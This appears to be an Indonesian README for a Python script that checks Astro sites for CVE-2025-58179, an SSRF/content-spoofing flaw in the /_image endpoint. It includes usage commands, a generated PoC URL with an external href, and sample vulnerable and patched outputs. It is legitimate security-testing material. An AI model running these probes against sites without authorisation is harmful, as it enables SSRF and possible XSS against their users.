# CVE-2025-58179-Check

**CVE-2025-58179-Check** adalah skrip Python sederhana untuk memverifikasi kerentanan SSRF (Server-Side Request Forgery) / Content Spoofing pada endpoint `/_image` di framework Astro.

Kerentanan ini dilacak sebagai [**GHSA-qpr4-c339-7vq8**](https://github.com/withastro/astro/security/advisories/GHSA-qpr4-c339-7vq8) dan [**CVE-2025-58179**](https://nvd.nist.gov/vuln/detail/CVE-2025-58179).

## Latar Belakang Kerentanan

Kerentanan ini berdampak pada situs Astro yang menggunakan adapter `@astrojs/cloudflare` dengan konfigurasi `output: 'server'`. Endpoint `/_image` yang seharusnya mengoptimasi gambar, gagal memvalidasi parameter `href` dengan benar.

Hal ini memungkinkan penyerang untuk membuat server mengambil dan menyajikan konten dari domain eksternal manapun yang tidak sah. Dampaknya bisa berupa SSRF, dan jika konten eksternal tersebut adalah file berbahaya (seperti SVG yang berisi skrip), ini dapat mengarah ke **Cross-Site Scripting (XSS)**.

Skrip ini mengotomatiskan proses pengujian untuk melihat apakah sebuah situs rentan terhadap masalah ini.

## Fitur

* Membuat URL PoC (Proof of Concept) dengan format yang benar secara otomatis.
* Melakukan verifikasi HTTP (opsional) untuk memeriksa respons server.
* Memberi kode warna pada output untuk kemudahan analisis (Status Code, Hasil).
* Mendeteksi respons yang rentan (misalnya, `Status 200` dengan `Content-Type: image/*`).

## Persyaratan

* Python 3
* Pustaka `requests` (hanya jika menggunakan fungsionalitas verifikasi)

Anda dapat menginstal `requests` menggunakan pip:
```bash
pip install requests
````

## Cara Penggunaan

1.  Clone repositori ini atau salin skrip `CVE-2025-58179-Check.py`.
2.  Pastikan skrip dapat dieksekusi (jika perlu): `chmod +x CVE-2025-58179-Check.py`

### 1\. Hanya Membuat URL (Tanpa Verifikasi)

Opsi ini hanya akan mencetak URL PoC yang sudah di-encode. Berguna jika Anda ingin menguji secara manual di browser atau dengan tools lain.

**Perintah:**

```bash
python CVE-2025-58179-Check.py -u <URL_TARGET> -i <URL_GAMBAR_EKSTERNAL>
```

**Contoh:**

```bash
python CVE-2025-58179-Check.py -u [https://target-astro-site.com](https://target-astro-site.com) -i [https://example.com/image.jpg](https://example.com/image.jpg)
```

**Output:**

```
[+] Generated URL:
[https://target-astro-site.com/_image?href=https%3A%2F%2Fexample.com%2Fimage.jpg](https://target-astro-site.com/_image?href=https%3A%2F%2Fexample.com%2Fimage.jpg)
```

### 2\. Membuat URL dan Melakukan Verifikasi HTTP

Opsi ini akan membuat URL dan langsung mengirimkan permintaan HTTP GET untuk memverifikasi respons server.

**Perintah:**

```bash
python CVE-2025-58179-Check.py -u <URL_TARGET> -i <URL_GAMBAR_EKSTERNAL> -r
```

**Contoh:**

```bash
python CVE-2025-58179-Check.py -u [https://target-astro-site.com](https://target-astro-site.com) -i [https://example.com/image.jpg](https://example.com/image.jpg) --request
```

-----

## Contoh Output Verifikasi

### Contoh Hasil: Rentan (Vulnerable)

Jika server mengembalikan kode status 200 dan tipe konten adalah gambar, ini menandakan server telah mengambil dan menyajikan konten eksternal.

```
[+] Generated URL:
[https://target-astro-site.com/_image?href=https%3A%2F%2Fexample.com%2Fimage.jpg](https://target-astro-site.com/_image?href=https%3A%2F%2Fexample.com%2Fimage.jpg)

[+] Sending HTTP request...
[+] Status Code: 200
[+] Content Type: image/jpeg
[+] Server returned image content - Potential vulnerability detected!
```

### Contoh Hasil: Tidak Rentan (Sudah Dipatch)

Server yang sudah dipatch atau dikonfigurasi dengan benar akan menolak permintaan ke domain eksternal yang tidak sah, biasanya dengan mengembalikan status 4xx.

```
[+] Generated URL:
[https://target-astro-site.com/_image?href=https%3A%2F%2Fexample.com%2Fimage.jpg](https://target-astro-site.com/_image?href=https%3A%2F%2Fexample.com%2Fimage.jpg)

[+] Sending HTTP request...
[+] Status Code: 400
[+] Content Type: text/plain;charset=UTF-8
[+] Client error - Resource might not be accessible
```

> [!WARNING]
> **PERINGATAN**
>
> * Skrip ini dibuat untuk tujuan edukasi dan pengujian keamanan yang sah.
> * Pengguna bertanggung jawab penuh atas tindakan mereka. Jangan gunakan skrip ini pada sistem yang tidak Anda miliki izinnya.
